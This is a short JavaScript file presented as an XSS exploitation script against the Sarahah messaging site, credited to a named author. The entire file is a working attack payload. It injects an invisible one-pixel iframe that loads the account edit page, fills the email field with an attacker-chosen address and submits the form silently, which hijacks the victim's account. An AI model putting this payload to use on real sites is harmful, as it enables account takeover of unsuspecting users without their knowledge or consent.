/*
   ____                  _           _     
 / ___|  __ _ _ __ __ _| |__   __ _| |__  
 \___ \ / _` | '__/ _` | '_ \ / _` | '_ \ 
  ___) | (_| | | | (_| | | | | (_| | | | |
 |____/ \__,_|_|  \__,_|_| |_|\__,_|_| |_|
	   Sarahah XSS Exploitation Script
           Coded by Shawar Khan ( www.shawarkhan.com )
*/
// Email Change Exploit code
// Params Required: email

document.getElementsByClassName('col-xs-3')[0].innerHTML="<iframe id='myframe' src='https://"+document.domain+"/Manage/Edit' onload='d4rk()' width='1px' height='1px' style='opacity:0'></iframe>";
function d4rk(){;
var MyIFrame = document.getElementById("myframe");
var MyIFrameDoc = (MyIFrame.contentWindow || MyIFrame.contentDocument);
MyIFrameDoc = MyIFrameDoc.document;
MyIFrameDoc.getElementsByClassName('form-control')[1]['value'] = email;
MyIFrameDoc.getElementsByClassName('form-horizontal')[0].submit();
MyIFrame.onload=null;}